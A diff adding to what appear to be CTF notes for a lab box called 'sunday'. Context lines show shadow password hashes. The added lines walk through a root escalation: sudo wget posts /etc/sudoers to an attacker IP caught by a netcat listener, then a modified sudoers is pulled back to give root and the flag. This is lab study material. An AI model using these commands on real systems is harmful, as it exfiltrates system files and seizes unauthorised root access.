@@ -103,7 +103,19 @@ nobody4:*LK*:6445::::::
 sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
 sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 
-
-
+I reasearched a bit because cracking the root hash took so long. I found out that I can send over the sudoers file to my local
+machine, edit the permissions and later upload back to the victim machine which will enable me to login as root.
+sudo /usr/bin/wget --post-file=/etc/sudoers 10.10.14.13
+And on local machine you get the response from the sudoers file listening on : nc -lvnp 80
+I proceed and edit sammy's permissions to allow him to sudo on ALL
+I then set up a simple server : python -m SimpleHTTPServer 8080 and on victim machine:
+sudo /usr/bin/wget -O /etc/sudoers http://10.10.14.13:8080/sudoers --output-document=sudoers
+sammy@sunday:~$ sudo su
+root@sunday:~# id
+uid=0(root) gid=0(root)
+root@sunday:~# cat /root/root.txt
+fb40fab61d99d37536daeec0d97af9b8
+root@sunday:~#
 Interesting reference on rpcbind
 └─# https://crazeofcyber.blogspot.com/2019/10/exploit-rpcbind.html
+https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/
